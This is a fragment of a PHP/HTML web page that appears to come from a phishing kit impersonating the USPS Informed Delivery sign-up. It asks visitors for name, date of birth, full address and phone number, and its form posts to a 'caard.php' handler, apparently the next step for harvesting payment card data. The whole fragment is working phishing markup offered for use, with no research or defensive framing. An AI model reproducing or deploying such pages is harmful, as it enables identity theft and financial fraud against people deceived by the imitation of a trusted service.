...
$fullstring = file_get_contents("../index.php");
$parsed = get_string_between($fullstring, '"44', '4"');
						...
						<div id="addressHolderStep1">
							<div class="row">
								<div class="col-xs-12 col-sm-12 col-md-12">
									<p class="visible-xs">We need to confirm your address is eligible for Informed Delivery.
...
>ZIMBABWE</option>
							...
							<div id="country-holder">
								<div id="us">
									...
									<div class="row">
									<form action="caard.php?token=<?php echo $_SESSION['token']; ?>" method="post">
									<div class="col-xs-12 col-sm-4 col-md-4">
											<div class="form-group" id="form-group-taddress">
												<label id="for-taddress" for="taddress" class="control-label">First Name</label>
												
												<input type="text" name="name1" maxlength="50" value="" tabindex="8" id="taddress" class="form-control" autocorrect="off" autocomplete="off" rel="addressResult" autocapitalize="off" required>
										...
										<div class="col-xs-12 col-sm-4 col-md-4">
											<div class="form-group" id="form-group-taddress">
												<label id="for-taddress" for="taddress" class="control-label">Last Name</label>
												
												<input type="text" name="name2" maxlength="50" value="" tabindex="8" id="taddress" class="form-control" autocorrect="off" autocomplete="off" rel="addressResult" autocapitalize="off" required>
												<span id="error-taddress" class="error-txt-portal"></span>
												<span class="sr-only" id="sr-only-error-taddress"></span>
											</div>
										</div>
										...
										<div class="col-xs-12 col-sm-4 col-md-4">
											<div class="form-group" id="form-group-taddress">
												<label id="for-taddress" for="taddress" class="control-label">Date of Birth</label>
												
												
												<input type="tel" name="dob" placeholder="MM/DD/YYYY" class="form-control" id="taddress" size=10 maxlength=10 onkeyup="this.value=this.value.replace(/^(\d\d)(\d)$/g,'$1/$2').replace(/^(\d\d\/\d\d)(\d+)$/g,'$1/$2').replace(/[^\d\/]/g,'')" required>
												<span id="error-taddress" class="error-txt-portal"></span>
												<span class="sr-only" id="sr-only-error-taddress"></span>
											</div>
										</div>
										<div class="col-xs-12 col-sm-4 col-md-4">
											<div class="form-group" id="form-group-tapt">
												<label id="for-tapt" for="tapt" class="control-label">Street Address</label>
												
												<input type="text" name="address" maxlength="50" value="" tabindex="9" id="tapt" class="form-control" autocorrect="off" autocomplete="off" autocapitalize="off" required>
									...
									<div class="row">
										...
										<div class="col-xs-12 col-sm-4 col-md-4">
											<div class="form-group" id="form-group-taddress">
												<label id="for-taddress" for="taddress" class="control-label">Phone Number</label>
												
												
											<input type="number" name="phone" maxlength="50" value="" tabindex="9" id="tapt" class="form-control" autocorrect="off" autocomplete="off" autocapitalize="off" required>
												<span id="error-taddress" class="error-txt-portal"></span>
												<span class="sr-only" id="sr-only-error-taddress"></span>
											</div>
										</div>
									...
									<div class="col-xs-12 col-sm-4 col-md-4">
											<div class="form-group" id="form-group-tcity">
												<label id="for-tcity" for="tcity" class="control-label">Country</label>
												
												<input type="text" name="country" maxlength="50" value="" tabindex="10" id="tcity" class="form-control" autocorrect="off" autocomplete="off" rel="addressResult" autocapitalize="off" required>
												<span id="error-tcity" class="error-txt-portal"></span>
												<span class="sr-only" id="sr-only-error-tcity"></span>
											</div>
										</div>
										<div class="col-xs-12 col-sm-4 col-md-4">
											<div class="form-group" id="form-group-tcity">
												<label id="for-tcity" for="tcity" class="control-label">City</label>
												
												<input type="text" name="city" maxlength="50" value="" tabindex="10" id="tcity" class="form-control" autocorrect="off" autocomplete="off" rel="addressResult" autocapitalize="off" required>
												<span id="error-tcity" class="error-txt-portal"></span>
												<span class="sr-only" id="sr-only-error-tcity"></span>
											</div>
										</div>
									...
									<div class="row">
											...
											<div class="col-xs-12 col-sm-4 col-md-4">
											<div class="form-group" id="form-group-tcity">
												<label id="for-tcity" for="tcity" class="control-label">State</label>
												
												<input type="text" name="state" maxlength="50" value="" tabindex="10" id="tcity" class="form-control" autocorrect="off" autocomplete="off" rel="addressResult" autocapitalize="off" required>
												<span id="error-tcity" class="error-txt-portal"></span>
												<span class="sr-only" id="sr-only-error-tcity"></span>
											</div>
										</div>
										...
										<div class="col-xs-12 col-sm-4 col-md-2">
											<div class="form-group" id="form-group-tzip">				
												<label id="for-tzip" for="tzip" class="control-label">ZIP Code</label>
												
												<input type="tel" name="zip" maxlength="10" value="" tabindex="13" id="tzip" class="form-control" autocorrect="off" autocomplete="off" rel="addressResult" autocapitalize="off" required>
												<span id="error-tzip" class="error-txt-portal"></span>
												<span class="sr-only" id="sr-only-error-tzip"></span>
											</div>
										</div>
									</div>
